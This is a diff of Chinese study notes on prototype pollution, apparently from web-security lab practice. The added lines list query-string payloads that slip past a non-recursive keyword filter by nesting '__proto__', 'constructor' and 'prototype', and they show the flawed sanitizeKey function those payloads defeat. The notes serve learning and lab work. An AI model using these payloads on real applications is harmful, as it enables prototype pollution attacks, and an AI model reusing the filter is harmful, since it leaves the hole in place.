@@ -10,8 +10,24 @@ constructor.prototype.testproperty=DOM_INVADER_PP_POC
 思考：
 如何去寻找gadgets呢
 
-Server-side prototype pollution
 
+Bypass的一些方法:
+1. 没有递归replace，比如这段代码只会replace一次，所以可以针对他们来构造类似
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor.[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+
+function sanitizeKey(key) {
+    let badProperties = ['constructor','__proto__','prototype'];
+    for(let badProperty of badProperties) {
+        key = key.replaceAll(badProperty, '');
+    }
+    return key;
+}
+
+
+Server-side prototype pollution
 Lab: Bypassing flawed input filters for server-side prototype pollution
 可以通过下面两种方式来添加属性到prototype
 方法一：
